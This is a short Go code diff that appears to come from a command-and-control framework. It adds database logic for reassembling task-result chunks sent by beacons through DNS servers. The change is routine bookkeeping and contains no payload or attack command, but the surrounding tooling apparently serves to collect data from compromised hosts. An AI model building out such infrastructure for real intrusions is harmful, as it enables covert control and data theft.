@@ -1007,6 +1007,26 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 		d.markTaskCompleted(taskID)
 	}
 
+	// SHADOW MESH: Handle chunks from DNS servers that didn't receive META
+	// If totalChunks is 0 or unknown, try to get it from existing chunks
+	if totalChunks == 0 && chunkIndex > 0 {
+		var knownTotalChunks sql.NullInt64
+		err = d.db.QueryRow(`
+			SELECT total_chunks FROM task_results 
+			WHERE task_id = ? AND total_chunks > 0 
+			LIMIT 1
+		`, taskID).Scan(&knownTotalChunks)
+
+		if err == nil && knownTotalChunks.Valid {
+			totalChunks = int(knownTotalChunks.Int64)
+			// Update this chunk's total_chunks for consistency
+			d.db.Exec(`UPDATE task_results SET total_chunks = ? WHERE task_id = ? AND chunk_index = ?`,
+				totalChunks, taskID, chunkIndex)
+			fmt.Printf("[Master DB] Task %s: Updated chunk %d with totalChunks=%d from other chunks\n",
+				taskID, chunkIndex, totalChunks)
+		}
+	}
+
 	// If this is a multi-chunk result (and not the complete assembled one), check if we have all chunks
 	if totalChunks > 1 && chunkIndex > 0 {
 		// Check if we already have the complete assembled result
